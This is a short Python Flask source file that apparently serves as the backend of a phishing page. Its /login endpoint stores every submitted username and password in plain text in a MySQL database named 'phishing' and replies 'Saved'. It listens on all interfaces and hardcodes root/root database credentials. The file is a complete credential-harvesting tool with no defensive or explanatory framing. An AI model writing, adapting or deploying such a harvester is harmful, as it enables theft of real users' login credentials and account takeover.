from flask import Flask, request
import mysql.connector

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    user = request.form['username']
    pw = request.form['password']

    db = mysql.connector.connect(
        host="mysql",
        user="root",
        password="root",
        database="phishing"
    )
    cursor = db.cursor()
    cursor.execute("INSERT INTO creds VALUES (%s,%s)", (user, pw))
    db.commit()
    return "Saved"

app.run(host="0.0.0.0", port=5000)

